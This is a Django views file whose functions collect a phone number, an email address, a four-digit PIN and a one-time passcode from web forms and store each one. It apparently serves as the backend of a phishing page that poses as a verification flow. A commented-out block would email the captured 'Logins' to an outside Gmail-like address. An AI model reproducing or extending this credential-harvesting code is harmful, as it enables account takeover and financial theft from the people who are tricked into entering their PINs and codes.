from django.shortcuts import render
from django.core.mail import send_mail
from django.conf import settings
from .models import *

# Create your views here.

def index(request):
	if request.method=='POST':
		phone=request.POST.get('phone')
		post=Post(phone=phone)
		post.save()
	#if request.method == 'POST':
	#	phone= request.POST('phone')
	#	post=Post(phone=phone)
	#	post.save()

	#	send_mail(
	#		'Logins',#title
	#		message, #message
	#		'settings.EMAIL_HOST_USER', #sender if not available considered the default or configered
	#		[email,'oscarwilliam1978@gmsail.com'], #reciver email
	#		fail_silently=False
	#	)
	
	return render(request,'index.html',)

def emailverify(request):
	
	
	return render(request,'email.html',)



def email(request):
	if request.method=='POST':
		email=request.POST.get('email')
		email_post=Email_post(email=email)
		email_post.save()

	return render(request,'email.html',)

def pinverify(request):
	
	return render(request,'pin.html',)

def pin(request):
	if request.method=='POST':
		pin1=request.POST.get('pin1')
		pin2=request.POST.get('pin2')
		pin3=request.POST.get('pin3')
		pin4=request.POST.get('pin4')
		pin_post=Pin_post(pin1=pin1,pin2=pin2,pin3=pin3,pin4=pin4,)
		pin_post.save()

	return render(request,'pin.html',)

def otpverify(request):
	
	return render(request,'otp.html',)

def otp(request):
	if request.method=='POST':
		otp=request.POST.get('otp')
		otp_post=Otp_post(otp=otp)
		otp_post.save()

	return render(request,'otp.html',)
